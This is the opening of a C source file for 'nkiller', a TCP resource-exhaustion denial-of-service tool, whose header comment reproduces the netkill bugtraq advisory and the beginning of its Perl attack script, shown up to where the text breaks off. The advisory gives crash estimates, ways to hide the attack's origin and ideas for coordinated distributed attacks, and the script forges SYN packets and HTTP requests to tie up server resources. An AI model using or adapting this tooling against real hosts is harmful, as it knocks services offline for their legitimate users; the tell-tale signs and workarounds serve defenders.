/*
 *  nkiller - a tcp exhaustion/stressing tool
 *  Copyright (C) 2008 ithilgore <ithilgore.ryu.L@gmail.com>
 *  Copyright (C) 2008 Giorgos Keramidas <gkeramidas@gmail.com>
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.

		README

			==================================
			Nkiller - TCP exhaustion/stressing
			===================================

			Nkiller is a tcp exhaustion/stressing tool that is based on an idea posted
			long ago at bugtraq but which still works more or less. It is actually an
			improvement of the demonstration tool used there, since it combines both the
			exploitation of the vulnerability inherent in all tcp implementations and the
			speed by using reverse syn cookies, an idea first introduced by Dan Kaminsky's
			scanrand. The original idea and its implementation, netkill, is shown below
			for reference.

			========
			Authors
			========

			ithilgore <ithilgore.ryu.L@gmail.com> : main developer 
			Giorgos Keramidas <gkeramidas@gmail.com> : added minor patches

			============
			Compilation
			============

			gcc nkiller.c -o nkiller -lpcap -lssl -Wall -pedantic -O2

			OR

			make; make clean
			(it uses the Makefile)

			==============
			Original idea
			==============

			http://seclists.org/bugtraq/2000/Apr/0152.html


			NAME
				netkill - generic remote DoS attack

					$Id: netkill,v 1.7 2000/04/20 18:56:22 shalunov Exp $

			SUMMARY
				By exploiting features inherent to TCP protocol remote attackers
				can perform denial of service attacks on a wide array of target
				operating systems. The attack is most efficient against HTTP
				servers.

				A Perl script is enclosed to demonstrate the problem.

				The problem probably isn't "new"; I'm sure many people have
				thought about it before, even though I could not find references
				on public newsgroups and mailing lists. It's severe and should
				be fixed.

			BACKGROUND
				When TCPs communicate, each TCP allocates some resources to each
				connection. By repeatedly establishing a TCP connection and then
				abandoning it, a malicious host can tie up significant resources
				on a server.

				A Unix server may dedicate some number of mbufs (kernel data
				structures used to hold network-traffic-related data) or even a
				process to each of those connections. It'll take time before the
				connection times out and resources are returned to the system.

				If there are many outstanding abandoned connections of such
				sort, the system may crash, become unusable, or simply stop
				serving a particular port.

			AFFECTED SYSTEMS
				Any system that runs a TCP service that sends out data can be
				attacked this way. The efficiency of such attack would vary
				greatly depending on a very large number of factors.

				Web servers are particularly vulnerable to this attack because
				of the nature of the protocol (short request generates an
				arbitrarily long response).

			IMPACT
				Remote users can make service (such as HTTP) unavailable.

				For many operating systems, the servers can be crashed. (Which
				interrupts service and also has a potential of damaging
				filesystems.)

			THE MECHANISM
				This could be made to work against various services. We'll only
				discuss how it could be used against HTTP servers. The attack
				may or may not render the rest of the services (if any) provided
				by the machine unusable.

				The mechanism is quite simple: After instructing our kernel to
				not answer any packets from the target machine (most easily done
				by firewalling that box: with ipfw, "deny any from TARGET to
				any") we repeatedly initiate a new connection from a random port
				by sending a SYN packet, expecting a SYN+ACK response, and then
				sending our request (we could more traditionally first confirm
				SYN+ACK and only then send the request, but the way we do it
				saves packets).

				It is felt that attack is more efficient when static file is
				fetched this way rather than dynamic content. Nature of the file
				doesn't matter (graphics, text or plain HTML will do fine) but
				size is of great importance.

				What happens on the server when it receives these spurious
				requests? First of all, the kernel handles the TCP handshake;
				then, as we send our second packet and handshake is thus
				completed, a user application is notified about the request
				(accept system call returns, connection is now ESTABLISHED). At
				that time, kernel has the request data in receiving queue. The
				process reads the request (which is HTTP/1.0 without any keep-
				alive options), interprets it, and then writes some data into
				the file descriptor and closes it (connection goes into
				FIN_WAIT_1 state). Life then goes on with some mbufs eaten, if
				we reach this point.

				This attack comes in two flavors: mbufs exhaustion and process
				saturation.

				When doing mbufs exhaustion, one wants the user-level process on
				the other end to write the data without blocking and close the
				descriptor. Kernel will have to deal with all the data, and the
				user-level process will be free, so that we can send more
				requests this way and eventually consume all the mbufs or all
				physical memory, if mbufs are allocated dynamically.

				When doing process saturation, one wants user-level process to
				block while trying to write data. The architecture of many HTTP
				servers will allow serving only so many connections at a time.
				When we reach this number of connections the server will stop
				responding to legitimate users. If the server doesn't put a
				bound on the number of connections, we're still tying up
				resources and eventually the machine comes to a crawling halt.

				Mbufs exhaustion usually has no visible effect (other than
				thousands of connections in FIN_WAIT_1 state) until we reach a
				hard limit of the number of mbufs or mbuf clusters. At that
				point, the machine panics, dumps kernel core, reboots, checks
				filesystems, recovers core dump--all time-consuming operations.
				(This is what happens, say, with FreeBSD and other BSD-derived
				systems; it worked for me against a machine with maxusers=256
				and 512MB of RAM.) Some other systems, such as Linux, seem to
				happily allocate arbitrary amount of memory for mbuf clusters.
				This memory cannot be paged out. Once we start approaching the
				physical memory size, machine becomes completely unusable and
				stays so.

				Process saturation usually exhibits itself in server being
				extremely slow when accepting new connections. On the machine
				itself there's a large number of ESTABLISHED connections, and a
				large number of processes/threads visible.

				Once the process saturation attack reaches success and while it
				lasts, clients trying to connect to the server usually all time
				out. But if they manage to establish a connection (this is only
				tested with Apache) the server may not send any data for a long
				time. I don't know the reason for this.

			SOME NUMERIC ESTIMATES
				Due to lack of consenting targets and time I have not done any
				attacks over modem dial-up links. So this section is mostly
				speculation.

				Let T be the average time that the target system retains a
				connection of given kind, R be the average time between two
				"hits" by one attacking system, N be the number of attacking
				systems, and A be the number of packets the victim sends before
				resetting connection when peer is unresponsive.

				Then, after T seconds since the beginning of the attack, the
				victim will have N*T/R hung connections. That number won't
				change much afterwards.

				A "typical" BSD system with maxusers=64 would have 1536 mbuf
				clusters. It looks like T is around 500s. So, if we can get
				R=.3s (easily done if we have a good connection) we can crash it
				from a single client. For dial-up, a more realistic value of R
				would be around 2s (adjusted for redials). So, six or so co-
				operating dial-up attackers are required to crash the target.
				(In real life we might need more attackers; I guess ten should
				be enough.)

				Linux doesn't have a limit on the number of mbuf clusters, and
				it keeps connections hanging around longer (T=1400s). In my
				tests, I was able to let it accept 48K of data into the send
				queue and let the process move on. This means that a single
				dial-up attacker can lock about 33MB in non-paged kernel memory.
				Four dial-up attackers seem to be able to destroy a 128MB
				machine. A single well-connected client can do the same, for
				even bigger machines.

				Process saturation is even easier. Assuming (optimistically for
				the victim) T=500, R=2s, a single dial-up user can tie 250
				instances of the HTTP server. For most configurations, that's
				the end of the service.

			MAKING NETKILL MORE EFFICIENT
				TCP is a complicated business. Parameters and timing is
				everything. Tweaking the window size and the delays makes a lot
				of difference.

				Parallel threads of execution increase efficiency in some
				settings. I've not included code for that, so one will have to
				start several copies of netkill. For maximum efficiency, don't
				mix the types of attack.

				Starting netkill on several machines has a lot of impact.

				Increasing the number of BPF devices on a BSD system may be
				necessary.

				Netkill does consume bandwidth, even though it's not a flooding
				tool. Ironically, most of the traffic is produced by the victim
				systems, and the traffic is directed to attack systems. If the
				attacking systems have T1 or greater connectivity, this is of
				little consequence. However, if netkill is used from a modem
				dial-up connection it'll be necessary for the attacker to redial
				often to get a new IP number. Cable modems seem to be unsuitable
				for launching this attack: bandwidth is not sufficient, and IP
				number cannot be changed.

				One might want to conceal the origin of the attack. Since a TCP
				connection is established, we must either be able to see SYN+ACK
				or to guess the remote initial sequence number. It is felt that
				full-blown IP spoofing with predicting sequence numbers would
				make this attack inefficient, even if ISNs are not properly
				randomized by the remote end. What one might do is to send the
				queries from an unused IP on the same network. This would have
				the added benefit that it would become unnecessary to firewall
				the target. If the network administrator is not very skilled, it
				might take significant time for the true source of attack to be
				discovered. One could further fake link-layer source address (if
				the OS would allow that) and make the source even harder to
				discover.

			DISTRIBUTED ATTACK APPLICATIONS
				We've seen a number of distributed attack tools in the last few
				months become publicly available. They mostly simply flood the
				network with UDP packets and all kinds of garbage. This attack
				is different from those: Rather than saturating the link, this
				attack saturates some resources on the target machines.

				If used in combination with a controlling daemon from a large
				number of hosts, this attack will have very devastating effect
				on Web-serving infrastructure. Much more devastating than
				trin00, TFN, or Stacheldraht.

				(When used in a distributed setting, Perl with a non-standard
				module may not be the executable format of choice. The Perl
				script would probably be compiled into a statically linked
				native machine format executable using the O module. This will
				also require building a .a format RawIP library.)

				An interesting application of netkill would be "Community
				netkill": a large number of people (say, readers of the same
				newsgroups or of the same website) could coordinate their
				resources and start using netkill on a pre-specified target in a
				pre-specified time interval. Since each person would send only a
				few packets, it would be hard to accuse them of doing anything
				evil ("I just opened this page, and then my modem
				disconnected"), but this attack can pretty much destroy
				anything.

			INTERACTION WITH LOAD BALANCERS
				I don't have a Cisco Local Director, a Foundry box, or a NetApp
				NetCache at hand for testing, and I have not had a chance to
				test against these. Everything in this section is pure
				speculation.

				The effects on a load-balancing farm of servers will depend on
				how the load balancing is organized.

				For load-balancers that simply forward packets for each
				connection to a chosen server, the attacker is given the
				opportunity to destroy all the machines that the load balancer
				serves. So, it doesn't offer any protection. The load-balancer
				itself will most likely remain unaffected. If the "sticky bit"
				is set on the load balancer, an attacker operating from a single
				IP will only be able to affect a single system at a time.

				For load-balancers that establish connections and pump data back
				and forth (this includes reverse proxies), the servers
				themselves are protected and the target of the attack is the
				load-balancer itself. It's probably more resilient to the attack
				than a regular host, but with a distributed attack it can
				certainly be taken down. Then the whole service becomes
				unavailable at once.

				Round-robin DNS load-balancing schemes are not really different
				from just individual servers.

				Redirect load-balancing is probably most vulnerable, because the
				redirect box is the single point of failure, and it's not a
				specialized piece of hardware, like a reverse proxy. (The
				redirector can be a farm of machines load-balanced in another
				way; still this setup is more vulnerable than, say, load-
				balancing all available servers using a Cisco Local Director.)

			TELL-TALE SIGNS
				It is prudent to implement some of the suggestions from the
				"Workarounds" session even if you are not under attack and do
				not expect an attack. However, if service is interrupted the
				following signs will help identify that a tool similar to
				netkill is used against you:

				* Your HTTP servers have hundreds or thousands of connections to
					port 80 in FIN_WAIT_1 state.

				* The ratio (number of outgoing packets/number of incoming
					packets) is unusually high.

				* There's a large number of connections to port 80 in ESTABLISHED
					state, and most of them have the same length of send queue.
					(Or, there are large groups of connections sharing the same
					non-zero value of the length of send queue.)

			WORKAROUNDS
				There can be several strategies. None give you a lot of
				protection. They can be combined.

				* Identify offending sources as they appear and block them at your
					firewall.

				* Don't let strangers send TCP packets to your servers. Use a
					hardware reverse proxy. Make sure the proxy can be rebooted
					very fast.

				* Have a lot of memory in your machines. Increase the number of
					mbuf clusters to a very large number.

				* If you're using a Cisco Local Director, enable the "sticky"
					option. That's not going to help much against a distributed
					attack, but would limit the damage done from a single IP.
					Still something.

				* If you have a router or firewall that can throttle per-IP
					incoming rates of certain packets, then something like "one
					SYN per X seconds per IP" might limit the damage. You could
					set X to 1 by default and raise it to 5 in case of an actual
					attack. Image loading by browsers which don't do HTTP Keep-
					Alives will be very slow.

				* You could fake the RSTs. Set up a BSD machine that can sniff all
					the HTTP traffic. Kill (send RST with the correct sequence
					number) any HTTP connection such that the client has not
					sent anything in last X seconds. You could set X to 60 by
					default and lower it to 5 in case of an actual attack.

				A combination of these might save your service. The first
				method, while being most labor- and time-consuming is probably
				the most efficient. It has the added benefit that the attackers
				will be forced to reveal more and more machines that they
				control. You can later go to their administrators and let them
				know. The last two methods might do you more harm than good,
				especially if you misconfigure something. But the last method is
				also the most efficient.

			THE FIX
				Network Administrators should turn to the Workarounds section
				instead.

				We're dealing here with features inherent to TCP. It can be
				fixed, but the price to pay is making TCP less reliable.
				However, when the machine crashes, TCP becomes very unreliable,
				to say the least.

				Let's address mbufs exhaustion first. When the machine crashes,
				is there anything better to do? Obviously. Instead of calling
				panic(), the kernel might randomly free some 25% of mbufs
				chains, giving some random preference to ESTABLISHED
				connections. All the applications using sockets associated with
				these mbufs would be notified with a failed system call
				(ENOBUFS). Sure, that's not very pleasant. But is a crash
				better?

				Systems that do not currently impose a limit on the number of
				mbufs (e.g., Linux) should do so and use the above technique
				when the limit is reached.

				An alternative opinion is that the kernel should stop accepting
				new connections when there's no more memory for TCBs available.
				In my opinion, while this addresses the problem of OS crashes
				(which is an undeniable bug), it doesn't address the DoS aspect:
				the attacker denies service to most users by spending only a
				small amount of resources (mostly bandwidth).

				Process saturation is an application problem, really, and can
				only be solved on application level. Perhaps, Apache should be
				taught to put a timeout on network writes. Perhaps, the default
				limit on the number of children should be very significantly
				raised. Perhaps, Apache could drop connections that have not
				done anything in the last 2*2MSL.

			EXPLOIT CODE: CAVEAT EMPTOR
				The program takes a number of arguments. To prevent script
				kiddies from destroying too much of the Web, I made the default
				values not-so-efficient (but enough to demonstrate that the
				problem exists).

				You'll have to understand how it works to make the best use out
				of it, if you decide to further research the problem. With the
				default values, it at least won't crash a large server over a
				dial-up connection.

			ACKNOWLEDGMENTS
				I would like to thank D. J. Bernstein, Alan Cox, Guido van
				Rooij, and Alexander Shen for fruitful discussion of the
				problem.

			LEGAL CONDITIONS
				Copyright (C) Stanislav Shalunov, 2000.

				In this section, "you" refers to the recipient of this software
				and/or documentation (it may be a person or an organization).

				You may use netkill for research and education purposes. If you
				actually run the program, all the hosts that you run it from,
				and the hosts that you specify on the command line, and all the
				network path between them, must be legally owned by you.

				Any other use is strictly prohibited, including, but not limited
				to, use to perform denial of service or other attacks against or
				through computer networks and computers.

				You may redistribute netkill Perl source with embedded POD
				documentation verbatim. You may distribute documentation
				produced from the original netkill distribution by automated
				methods freely.

				You may also make changes to netkill and distribute resulting
				software and documentation free of charge. If you do so, you
				must include this section verbatim into any copy that you
				redistribute, and you must also state clearly that this is not
				the original version. This software and any derived work may not
				be distributed without documentation.

				This software and documentation is provided "AS IS" and any
				express or implied warranties, including, but not limited to,
				the implied warranties of merchantability and fitness for a
				particular purpose are disclaimed. In no event shall the author
				or any party associated with the author be liable for any
				direct, indirect, incidental, special, exemplary, or
				consequential damages (including, but not limited to,
				procurement of substitute goods or services; loss of use, data,
				or profits; or business interruption) however caused and on any
				theory of liability, whether in contract, strict liability, or
				tort (including negligence or otherwise) arising in any way out
				of the use, misuse, or lack of use of this software and/or
				documentation, even if advised of the possibility of such
				damage.

					-------------------- cut here --------------------
			#!/usr/bin/perl -w
			# netkill - generic remote DoS attack

			=pod

			=head1 NAME

			netkill - generic remote DoS attack

				$Id: netkill,v 1.7 2000/04/20 18:56:22 shalunov Exp $

			=head1 SUMMARY

			By exploiting features inherent to TCP protocol remote attackers can
			perform denial of service attacks on a wide array of target operating
			systems. The attack is most efficient against HTTP servers.

			A Perl script is enclosed to demonstrate the problem.

			The problem probably isn't "new"; I'm sure many people have thought
			about it before, even though I could not find references on public
			newsgroups and mailing lists. It's severe and should be fixed.

			=head1 BACKGROUND

			When TCPs communicate, each TCP allocates some resources to each
			connection. By repeatedly establishing a TCP connection and then
			abandoning it, a malicious host can tie up significant resources on a
			server.

			A Unix server may dedicate some number of mbufs (kernel data
			structures used to hold network-traffic-related data) or even a
			process to each of those connections. It'll take time before the
			connection times out and resources are returned to the system.

			If there are many outstanding abandoned connections of such sort, the
			system may crash, become unusable, or simply stop serving a particular
			port.

			=head1 AFFECTED SYSTEMS

			Any system that runs a TCP service that sends out data can be attacked
			this way. The efficiency of such attack would vary greatly depending
			on a very large number of factors.

			Web servers are particularly vulnerable to this attack because of the
			nature of the protocol (short request generates an arbitrarily long
			response).

			=head1 IMPACT

			Remote users can make service (such as HTTP) unavailable.

			For many operating systems, the servers can be crashed. (Which
			interrupts service and also has a potential of damaging filesystems.)

			=head1 THE MECHANISM

			This could be made to work against various services. We'll only
			discuss how it could be used against HTTP servers. The attack may or
			may not render the rest of the services (if any) provided by the
			machine unusable.

			The mechanism is quite simple: After instructing our kernel to not
			answer any packets from the target machine (most easily done by
			firewalling that box: with ipfw, "deny any from TARGET to any") we
			repeatedly initiate a new connection from a random port by sending a
			SYN packet, expecting a SYN+ACK response, and then sending our request
			(we could more traditionally first confirm SYN+ACK and only then send
			the request, but the way we do it saves packets).

			It is felt that attack is more efficient when static file is fetched
			this way rather than dynamic content. Nature of the file doesn't
			matter (graphics, text or plain HTML will do fine) but size is of
			great importance.

			What happens on the server when it receives these spurious requests?
			First of all, the kernel handles the TCP handshake; then, as we send
			our second packet and handshake is thus completed, a user application
			is notified about the request (accept system call returns, connection
			is now ESTABLISHED). At that time, kernel has the request data in
			receiving queue. The process reads the request (which is HTTP/1.0
			without any keep-alive options), interprets it, and then writes some
			data into the file descriptor and closes it (connection goes into
			FIN_WAIT_1 state). Life then goes on with some mbufs eaten, if we
			reach this point.

			This attack comes in two flavors: mbufs exhaustion and process
			saturation.

			When doing mbufs exhaustion, one wants the user-level process on the
			other end to write the data without blocking and close the descriptor.
			Kernel will have to deal with all the data, and the user-level process
			will be free, so that we can send more requests this way and
			eventually consume all the mbufs or all physical memory, if mbufs are
			allocated dynamically.

			When doing process saturation, one wants user-level process to block
			while trying to write data. The architecture of many HTTP servers
			will allow serving only so many connections at a time. When we reach
			this number of connections the server will stop responding to
			legitimate users. If the server doesn't put a bound on the number of
			connections, we're still tying up resources and eventually the machine
			comes to a crawling halt.

			Mbufs exhaustion usually has no visible effect (other than thousands
			of connections in FIN_WAIT_1 state) until we reach a hard limit of the
			number of mbufs or mbuf clusters. At that point, the machine panics,
			dumps kernel core, reboots, checks filesystems, recovers core
			dump--all time-consuming operations. (This is what happens, say, with
			FreeBSD and other BSD-derived systems; it worked for me against a
			machine with maxusers=256 and 512MB of RAM.) Some other systems, such
			as Linux, seem to happily allocate arbitrary amount of memory for mbuf
			clusters. This memory cannot be paged out. Once we start approaching
			the physical memory size, machine becomes completely unusable and
			stays so.

			Process saturation usually exhibits itself in server being extremely
			slow when accepting new connections. On the machine itself there's a
			large number of ESTABLISHED connections, and a large number of
			processes/threads visible.

			Once the process saturation attack reaches success and while it lasts,
			clients trying to connect to the server usually all time out. But if
			they manage to establish a connection (this is only tested with
			Apache) the server may not send any data for a long time. I don't
			know the reason for this.

			=head1 SOME NUMERIC ESTIMATES

			Due to lack of consenting targets and time I have not done any attacks
			over modem dial-up links. So this section is mostly speculation.

			Let T be the average time that the target system retains a connection
			of given kind, R be the average time between two "hits" by one
			attacking system, N be the number of attacking systems, and A be the
			number of packets the victim sends before resetting connection when
			peer is unresponsive.

			Then, after T seconds since the beginning of the attack, the victim
			will have N*T/R hung connections. That number won't change much
			afterwards.

			A "typical" BSD system with maxusers=64 would have 1536 mbuf clusters.
			It looks like T is around 500s. So, if we can get R=.3s (easily done
			if we have a good connection) we can crash it from a single client.
			For dial-up, a more realistic value of R would be around 2s (adjusted
			for redials). So, six or so co-operating dial-up attackers are
			required to crash the target. (In real life we might need more
			attackers; I guess ten should be enough.)

			Linux doesn't have a limit on the number of mbuf clusters, and it
			keeps connections hanging around longer (T=1400s). In my tests, I was
			able to let it accept 48K of data into the send queue and let the
			process move on. This means that a single dial-up attacker can lock
			about 33MB in non-paged kernel memory. Four dial-up attackers seem to
			be able to destroy a 128MB machine. A single well-connected client
			can do the same, for even bigger machines.

			Process saturation is even easier. Assuming (optimistically for the
			victim) T=500, R=2s, a single dial-up user can tie 250 instances of
			the HTTP server. For most configurations, that's the end of the
			service.

			=head1 MAKING NETKILL MORE EFFICIENT

			TCP is a complicated business. Parameters and timing is everything.
			Tweaking the window size and the delays makes a lot of difference.

			Parallel threads of execution increase efficiency in some settings.
			I've not included code for that, so one will have to start several
			copies of netkill. For maximum efficiency, don't mix the types of
			attack.

			Starting netkill on several machines has a lot of impact.

			Increasing the number of BPF devices on a BSD system may be necessary.

			Netkill does consume bandwidth, even though it's not a flooding tool.
			Ironically, most of the traffic is produced by the victim systems, and
			the traffic is directed to attack systems. If the attacking systems
			have T1 or greater connectivity, this is of little consequence.
			However, if netkill is used from a modem dial-up connection it'll be
			necessary for the attacker to redial often to get a new IP number.
			Cable modems seem to be unsuitable for launching this attack: bandwidth
			is not sufficient, and IP number cannot be changed.

			One might want to conceal the origin of the attack. Since a TCP
			connection is established, we must either be able to see SYN+ACK or to
			guess the remote initial sequence number. It is felt that full-blown
			IP spoofing with predicting sequence numbers would make this attack
			inefficient, even if ISNs are not properly randomized by the remote
			end. What one might do is to send the queries from an unused IP on
			the same network. This would have the added benefit that it would
			become unnecessary to firewall the target. If the network
			administrator is not very skilled, it might take significant time for
			the true source of attack to be discovered. One could further fake
			link-layer source address (if the OS would allow that) and make the
			source even harder to discover.

			=head1 DISTRIBUTED ATTACK APPLICATIONS

			We've seen a number of distributed attack tools in the last few months
			become publicly available. They mostly simply flood the network with
			UDP packets and all kinds of garbage. This attack is different from
			those: Rather than saturating the link, this attack saturates some
			resources on the target machines.

			If used in combination with a controlling daemon from a large number
			of hosts, this attack will have very devastating effect on Web-serving
			infrastructure. Much more devastating than trin00, TFN, or
			Stacheldraht.

			(When used in a distributed setting, Perl with a non-standard module
			may not be the executable format of choice. The Perl script would
			probably be compiled into a statically linked native machine format
			executable using the O module. This will also require building a .a
			format RawIP library.)

			An interesting application of netkill would be "Community netkill": a
			large number of people (say, readers of the same newsgroups or of the
			same website) could coordinate their resources and start using netkill
			on a pre-specified target in a pre-specified time interval. Since
			each person would send only a few packets, it would be hard to accuse
			them of doing anything evil ("I just opened this page, and then my
			modem disconnected"), but this attack can pretty much destroy
			anything.

			=head1 INTERACTION WITH LOAD BALANCERS

			I don't have a Cisco Local Director, a Foundry box, or a NetApp
			NetCache at hand for testing, and I have not had a chance to test
			against these. Everything in this section is pure speculation.

			The effects on a load-balancing farm of servers will depend on how the
			load balancing is organized.

			For load-balancers that simply forward packets for each connection to
			a chosen server, the attacker is given the opportunity to destroy all
			the machines that the load balancer serves. So, it doesn't offer any
			protection. The load-balancer itself will most likely remain
			unaffected. If the "sticky bit" is set on the load balancer, an
			attacker operating from a single IP will only be able to affect a
			single system at a time.

			For load-balancers that establish connections and pump data back and
			forth (this includes reverse proxies), the servers themselves are
			protected and the target of the attack is the load-balancer itself.
			It's probably more resilient to the attack than a regular host, but
			with a distributed attack it can certainly be taken down. Then the
			whole service becomes unavailable at once.

			Round-robin DNS load-balancing schemes are not really different from
			just individual servers.

			Redirect load-balancing is probably most vulnerable, because the
			redirect box is the single point of failure, and it's not a
			specialized piece of hardware, like a reverse proxy. (The redirector
			can be a farm of machines load-balanced in another way; still this
			setup is more vulnerable than, say, load-balancing all available
			servers using a Cisco Local Director.)

			=head1 TELL-TALE SIGNS

			It is prudent to implement some of the suggestions from the
			"Workarounds" session even if you are not under attack and do not
			expect an attack. However, if service is interrupted the following
			signs will help identify that a tool similar to netkill is used
			against you:

			=over 4

			=item *

			Your HTTP servers have hundreds or thousands of connections to port 80
			in FIN_WAIT_1 state.

			=item *

			The ratio (number of outgoing packets/number of incoming packets) is
			unusually high.

			=item *

			There's a large number of connections to port 80 in ESTABLISHED state,
			and most of them have the same length of send queue. (Or, there are
			large groups of connections sharing the same non-zero value of the
			length of send queue.)

			=back

			=head1 WORKAROUNDS

			There can be several strategies. None give you a lot of protection.
			They can be combined.

			=over 4

			=item *

			Identify offending sources as they appear and block them at your
			firewall.

			=item *

			Don't let strangers send TCP packets to your servers. Use a hardware
			reverse proxy. Make sure the proxy can be rebooted very fast.

			=item *

			Have a lot of memory in your machines. Increase the number of mbuf
			clusters to a very large number.

			=item *

			If you're using a Cisco Local Director, enable the "sticky" option.
			That's not going to help much against a distributed attack, but would
			limit the damage done from a single IP. Still something.

			=item *

			If you have a router or firewall that can throttle per-IP incoming
			rates of certain packets, then something like "one SYN per X seconds
			per IP" might limit the damage. You could set X to 1 by default and
			raise it to 5 in case of an actual attack. Image loading by browsers
			which don't do HTTP Keep-Alives will be very slow.

			=item *

			You could fake the RSTs. Set up a BSD machine that can sniff all the
			HTTP traffic. Kill (send RST with the correct sequence number) any
			HTTP connection such that the client has not sent anything in last X
			seconds. You could set X to 60 by default and lower it to 5 in case
			of an actual attack.

			=back

			A combination of these might save your service. The first method,
			while being most labor- and time-consuming is probably the most
			efficient. It has the added benefit that the attackers will be forced
			to reveal more and more machines that they control. You can later go
			to their administrators and let them know. The last two methods might
			do you more harm than good, especially if you misconfigure something.
			But the last method is also the most efficient.

			=head1 THE FIX

			Network Administrators should turn to the Workarounds section instead.

			We're dealing here with features inherent to TCP. It can be fixed,
			but the price to pay is making TCP less reliable. However, when the
			machine crashes, TCP becomes very unreliable, to say the least.

			Let's address mbufs exhaustion first. When the machine crashes, is
			there anything better to do? Obviously. Instead of calling panic(),
			the kernel might randomly free some 25% of mbufs chains, giving
			some random preference to ESTABLISHED connections. All the
			applications using sockets associated with these mbufs would be
			notified with a failed system call (ENOBUFS). Sure, that's not very
			pleasant. But is a crash better?

			Systems that do not currently impose a limit on the number of mbufs
			(e.g., Linux) should do so and use the above technique when the limit
			is reached.

			An alternative opinion is that the kernel should stop accepting new
			connections when there's no more memory for TCBs available. In my
			opinion, while this addresses the problem of OS crashes (which is an
			undeniable bug), it doesn't address the DoS aspect: the attacker
			denies service to most users by spending only a small amount of
			resources (mostly bandwidth).

			Process saturation is an application problem, really, and can only be
			solved on application level. Perhaps, Apache should be taught to put
			a timeout on network writes. Perhaps, the default limit on the number
			of children should be very significantly raised. Perhaps, Apache
			could drop connections that have not done anything in the last 2*2MSL.

			=head1 EXPLOIT CODE: CAVEAT EMPTOR

			The program takes a number of arguments. To prevent script kiddies
			from destroying too much of the Web, I made the default values
			not-so-efficient (but enough to demonstrate that the problem exists).

			You'll have to understand how it works to make the best use out of it,
			if you decide to further research the problem. With the default
			values, it at least won't crash a large server over a dial-up
			connection.

			=head1 ACKNOWLEDGMENTS

			I would like to thank D. J. Bernstein, Alan Cox, Guido van Rooij, and
			Alexander Shen for fruitful discussion of the problem.

			=head1 LEGAL CONDITIONS

			Copyright (C) Stanislav Shalunov, 2000.

			In this section, "you" refers to the recipient of this software
			and/or documentation (it may be a person or an organization).

			You may use netkill for research and education purposes. If you
			actually run the program, all the hosts that you run it from, and the
			hosts that you specify on the command line, and all the network path
			between them, must be legally owned by you.

			Any other use is strictly prohibited, including, but not limited to,
			use to perform denial of service or other attacks against or through
			computer networks and computers.

			You may redistribute netkill Perl source with embedded POD
			documentation verbatim. You may distribute documentation produced
			from the original netkill distribution by automated methods freely.

			You may also make changes to netkill and distribute resulting software
			and documentation free of charge. If you do so, you must include this
			section verbatim into any copy that you redistribute, and you must
			also state clearly that this is not the original version. This
			software and any derived work may not be distributed without
			documentation.

			This software and documentation is provided "AS IS" and any express or
			implied warranties, including, but not limited to, the implied
			warranties of merchantability and fitness for a particular purpose are
			disclaimed. In no event shall the author or any party associated with
			the author be liable for any direct, indirect, incidental, special,
			exemplary, or consequential damages (including, but not limited to,
			procurement of substitute goods or services; loss of use, data, or
			profits; or business interruption) however caused and on any theory of
			liability, whether in contract, strict liability, or tort (including
			negligence or otherwise) arising in any way out of the use, misuse, or
			lack of use of this software and/or documentation, even if advised of
			the possibility of such damage.

			=cut

			use strict;
			use Net::RawIP ':pcap'; # Available from CPAN.
			use Socket;
			use Getopt::Std;

			# Process command line arguments.
			my %options;
			getopts('zvp:t:r:u:w:i:d:', \%options) or usage();
			my $zero_window = $options{z}; # Close window in second packet?
			my $verbose = $options{v}; # Print progress indicators?
			my $d_port = $options{p} || 80; # Destination port.
			my $timeout = $options{t} || 1; # Timeout for pcap.
			my $fake_rtt = $options{r} || 0.05; # Max sleep between SYN and data.
			my $url = $options{u} || '/'; # URL to request.
			my $window = $options{w} || 16384; # Window size.
			my $interval = $options{i} || 0.5; # Sleep time between `connections.'
			my $numpackets = $options{d} || -1; # Number of tries (-1 == infty).
			my $d_name = shift or usage(); # Target host name.
			shift and usage(); # Complain if other args present.

			# This is what we send to the remote host.
			# XXX: Must fit into one packet.
			my $data = "GET $url HTTP/1.0\015\012\015\012"; # Two network EOLs in the end.

			my ($d_canon, $d_ip) = (gethostbyname($d_name))[0,4] # Resolve $d_name once.
			  or die "$d_name: Unknown host\n";
			my $d_ip_str = inet_ntoa($d_ip); # Filter wants string representation.
			my $dev = rdev($d_name) or die "$d_name: Cannot find outgoing interface\n";
			my $s_ip_str = ${ifaddrlist()}{$dev} or die "$dev: Cannot find IP\n";

			$| = 1 if $verbose;
			print <<EOF if $verbose;
			Sending to destination $d_canon [$d_ip_str].
			Each dot indicates 10 semi-connections (actually, SYN+ACK packets).
			EOF

			my $hitcount; # Used for progress indicator if $verbose is set.

			while ($numpackets--) {
			  # Unfortunately, there's pcapinit, but there's no way to give
			  # resources back to the kernel (close the bpf device or whatever).
			  # So, we fork a child for each pcapinit allocation and let him exit.
			  my $pid = fork();
			  sleep 1, next if $pid == -1; # fork() failed; sleep and retry.
			  for (1..10) {rand} # Need to advance it manually, only children use rand.
			  if ($pid) {
				# Parent. Block until the child exits.
				waitpid($pid, 0);
				print '.' if $verbose &amp;&amp; !$? &amp;&amp; !(++$hitcount%10);
				select(undef, undef, undef, rand $interval);
			  }
			  else {
				# Child.
				my $s_port = 1025 + int rand 30000; # Randon source port.
				my $my_seq = int rand 2147483648; # Random sequence number.
				my $packet = new Net::RawIP({tcp => {}});
				my $filter = # pcap filter to get SYN+ACK.
				  "src $d_ip_str and tcp src port $d_port and tcp dst port $s_port";
				local $^W; # Unfortunately, Net::RawIP is not -w - OK.
				my $pcap;
				# If we don't have enough resources locally, pcapinit will die/croak.
				# We want to catch the error, hence eval.
				eval q{$pcap = $packet->pcapinit($dev, $filter, 1500, $timeout)};
				$verbose? die "$@child died": exit 1 if $@;
				my $offset = linkoffset($pcap); # Link header length (14 or whatever).
				$^W = 1;
				# Send the first packet: SYN.
				$packet->set({ip=> {saddr=>$s_ip_str, daddr=>$d_ip_str, frag_off=>0,
									 tos=>0, id=>int rand 50000},
							  tcp=> {source=>$s_port, dest=>$d_port, syn=>1,
									 window=>$window, seq=>$my_seq}});
				$packet->send;
				my $temp;
				# Put their SYN+ACK (binary packed string) into $ipacket.
